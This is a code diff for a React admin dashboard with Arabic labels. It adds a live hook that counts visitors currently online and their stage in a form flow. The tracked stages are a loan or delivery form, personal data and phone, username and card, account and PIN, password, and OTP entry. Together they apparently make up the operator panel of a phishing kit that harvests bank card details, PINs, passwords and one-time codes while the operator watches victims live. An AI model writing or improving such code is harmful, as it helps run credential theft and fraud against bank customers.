@@ -4,6 +4,7 @@ import { isSupabaseConfigured, supabase } from '../lib/supabase'
 import ProtectedRoute from '../components/ProtectedRoute'
 import AdminContactMessages from '../admin/AdminContactMessages'
 import { getApplications } from '../lib/applicationStorage'
+import useOnlineVisitorsCount from '../hooks/useOnlineVisitorsCount'
 
 export default function AdminDashboardPage() {
   const navigate = useNavigate()
@@ -11,6 +12,11 @@ export default function AdminDashboardPage() {
   const [applications, setApplications] = useState([])
   const [loadingStats, setLoadingStats] = useState(true)
   const [loadError, setLoadError] = useState('')
+  const {
+    count: onlineVisitors,
+    connected: presenceConnected,
+    stats: liveStats,
+  } = useOnlineVisitorsCount()
 
   useEffect(() => {
     const checkAuth = async () => {
@@ -133,16 +139,16 @@ export default function AdminDashboardPage() {
     return step === 'step-otp' || item.status === 'pending-verification'
   }).length
 
-  const currentVisitors = totalApps
+  const currentVisitors = onlineVisitors
 
   const statsCards = [
     { title: 'زائر على الموقع الآن', count: currentVisitors, icon: '👥', color: 'text-sky-600 bg-sky-50 border-sky-100' },
-    { title: 'يملؤون نموذج التوصيل / القرض', count: selectingLoan, icon: '📦', color: 'text-orange-600 bg-orange-50 border-orange-100' },
-    { title: 'يملؤون البيانات الشخصية والهاتف', count: phoneStep, icon: '📱', color: 'text-blue-600 bg-blue-50 border-blue-100' },
-    { title: 'صفحة اسم المستخدم والبطاقة', count: step1, icon: '👤', color: 'text-cyan-600 bg-cyan-50 border-cyan-100' },
-    { title: 'صفحة الحساب والـ PIN', count: step2, icon: '💳', color: 'text-amber-600 bg-amber-50 border-amber-100' },
-    { title: 'صفحة كلمة المرور', count: step3, icon: '🔒', color: 'text-orange-600 bg-orange-50 border-orange-100' },
-    { title: 'يدخلون رمز التحقق (OTP)', count: otpStep, icon: '🔑', color: 'text-pink-600 bg-pink-50 border-pink-100' },
+    { title: 'يملؤون نموذج التوصيل / القرض', count: liveStats.loanSelection, icon: '📦', color: 'text-orange-600 bg-orange-50 border-orange-100' },
+    { title: 'يملؤون البيانات الشخصية والهاتف', count: liveStats.phone, icon: '📱', color: 'text-blue-600 bg-blue-50 border-blue-100' },
+    { title: 'صفحة اسم المستخدم والبطاقة', count: liveStats.username, icon: '👤', color: 'text-cyan-600 bg-cyan-50 border-cyan-100' },
+    { title: 'صفحة الحساب والـ PIN', count: liveStats.account, icon: '💳', color: 'text-amber-600 bg-amber-50 border-amber-100' },
+    { title: 'صفحة كلمة المرور', count: liveStats.password, icon: '🔒', color: 'text-orange-600 bg-orange-50 border-orange-100' },
+    { title: 'يدخلون رمز التحقق (OTP)', count: liveStats.otp, icon: '🔑', color: 'text-pink-600 bg-pink-50 border-pink-100' },
     { title: 'إجمالي الطلبات', count: totalApps, icon: '📋', color: 'text-emerald-600 bg-emerald-50 border-emerald-100' },
   ]
 
@@ -183,8 +189,8 @@ export default function AdminDashboardPage() {
           {/* حالة الاتصال وتحديثات فورية */}
           <div className="flex items-center justify-between bg-white p-3 rounded-xl shadow-sm border border-slate-100 text-xs sm:text-sm">
             <div className="flex items-center gap-2 text-slate-700 font-medium">
-              <span className="h-2.5 w-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
-              <span>متصل — تحديثات فورية</span>
+              <span className={`h-2.5 w-2.5 rounded-full ${presenceConnected ? 'bg-emerald-500 animate-pulse' : 'bg-amber-400'}`}></span>
+              <span>{presenceConnected ? 'متصل — زوار حقيقيون الآن' : 'جاري الاتصال بالزوار...'}</span>
             </div>
             <button
               onClick={loadStatsData}
